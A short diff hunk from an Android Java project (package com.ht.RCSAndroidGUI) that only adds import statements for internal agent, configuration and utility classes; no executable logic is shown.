@@ -7,6 +7,12 @@
 
 package com.ht.RCSAndroidGUI;
 
+import com.ht.RCSAndroidGUI.agent.Agent;
+import com.ht.RCSAndroidGUI.agent.AgentManager;
+import com.ht.RCSAndroidGUI.conf.Configuration;
+import com.ht.RCSAndroidGUI.utils.Check;
+import com.ht.RCSAndroidGUI.utils.Utils;
+
 import android.app.Activity;
 import android.content.ContentResolver;
 import android.content.res.Resources;
